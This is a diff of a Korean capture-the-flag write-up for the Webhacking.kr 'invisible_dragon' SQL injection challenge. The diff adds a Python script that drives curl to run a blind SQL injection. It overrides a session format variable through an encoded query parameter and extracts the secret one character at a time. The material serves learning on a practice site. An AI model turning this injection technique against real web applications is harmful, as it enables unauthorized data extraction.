@@ -2,7 +2,7 @@
 title: ["[Webhacking.kr] invisible_dragon (sqli - 300)"]
 date: 2024-12-14 09:00:00 +0900
 categories: [writeup, webhacking.kr]
-tags: [web, sqli]
+tags: [web, sqli, blind sqli, convert]
 ---
 
 ```php
@@ -96,7 +96,7 @@ MYSQL에서 `CONVERT()` 함수는
 * CONVERT(expr, type)
 두 가지 방식으로 사용된다.  
 
-아무리 짧게 사용을 해도 `convert({PAYLOAD},char)` 이렇게 구성되므로, 페이로드에 최대 10자리여야 한다.  
+아무리 짧게 사용을 해도 `convert({PAYLOAD},char)` 이렇게 구성되므로, 페이로드가 최대 10자리여야 한다.  
 
 먼저 간단히 `'1'='1'`로 테스트를 해보자.  
 ```
@@ -116,5 +116,37 @@ select * from prob_invisible_dragon where convert(1,char)='1'
 
 ```
 ?_SE%53SION[format]=convert(%s,char(1))&column=secret&keyword=F
+?_SE%53SION[format]=convert(%s,char(2))&column=secret&keyword=FL
 ```
-이런 형태로 Blind SQLi를 하면 될 것 같다.
+이런 형태로 Blind SQLi를 하면 될 것 같다.  
+
+python requests로 페이로드를 짜다가 인코딩 문제 때문에 화병이 날 뻔 했다.  
+`SE%53SION`이 더블인코딩되고, `%s`도 `%25s`로 변환되어 페이로드 길이 제한에 걸렸다.  
+
+결국 requests에서 인코딩을 해결하지 못하고, curl을 사용하기로 했다.  
+3%쯤은 모자란 페이로드라 보완방법을 더 고민해봐야겠다.  
+
+```python
+import subprocess
+from urllib.parse import quote
+
+url = "http://webhacking.kr:10016/"
+
+secret_len = 1
+secret = ""
+
+while True:
+    for i in range(33, 128):
+        payload = f"{url}?_SE%53SION%5Bformat%5D=convert(%s,char({secret_len}))&column=secret&keyword={secret}{quote(chr(i))}"
+        result = subprocess.run(['curl', '-s', payload], capture_output=True, text=True)
+
+        if "Search 1!" in result.stdout:
+            secret += quote(chr(i))
+            secret_len += 1
+            print(f"Found: {secret}")
+            break
+        if i == 127:
+            print("Not found")
+            exit(1)
+
+```
